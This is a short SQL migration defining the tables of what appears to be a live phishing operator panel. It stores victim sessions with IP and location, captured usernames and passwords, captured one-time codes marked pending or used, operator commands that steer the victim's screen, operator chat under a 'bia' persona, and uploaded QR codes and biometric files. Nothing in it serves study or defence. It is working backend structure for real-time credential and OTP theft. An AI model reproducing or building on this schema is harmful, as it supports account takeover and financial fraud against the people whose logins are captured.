CREATE TABLE `access_sessions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`userId` int NOT NULL,
	`ipAddress` varchar(45) NOT NULL,
	`country` varchar(100),
	`state` varchar(100),
	`city` varchar(100),
	`deviceType` varchar(50) DEFAULT 'Desktop',
	`status` enum('online','offline','paused') DEFAULT 'online',
	`currentScreen` varchar(255) DEFAULT 'Login',
	`capturedUsername` varchar(255),
	`capturedPassword` varchar(255),
	`operatorId` int,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	`lastActivityAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `access_sessions_id` PRIMARY KEY(`id`),
	CONSTRAINT `access_sessions_sessionId_unique` UNIQUE(`sessionId`)
);
--> statement-breakpoint
CREATE TABLE `captured_tokens` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`token` varchar(255) NOT NULL,
	`tokenType` varchar(50) DEFAULT 'OTP',
	`status` enum('pending','used','expired') DEFAULT 'pending',
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `captured_tokens_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `chat_messages` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`senderType` enum('operator','bia') NOT NULL,
	`message` text NOT NULL,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `chat_messages_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `command_logs` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`commandType` varchar(100) NOT NULL,
	`commandValue` text,
	`operatorId` int NOT NULL,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `command_logs_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `system_settings` (
	`id` int AUTO_INCREMENT NOT NULL,
	`operatorId` int NOT NULL,
	`blockSuspiciousAccess` boolean DEFAULT false,
	`requireTwoFactor` boolean DEFAULT false,
	`notifyNewLogins` boolean DEFAULT true,
	`biaAvatarUrl` varchar(255),
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `system_settings_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `uploads` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`uploadType` enum('qrcode','avatar','biometric') NOT NULL,
	`fileUrl` varchar(255) NOT NULL,
	`fileName` varchar(255),
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `uploads_id` PRIMARY KEY(`id`)
);
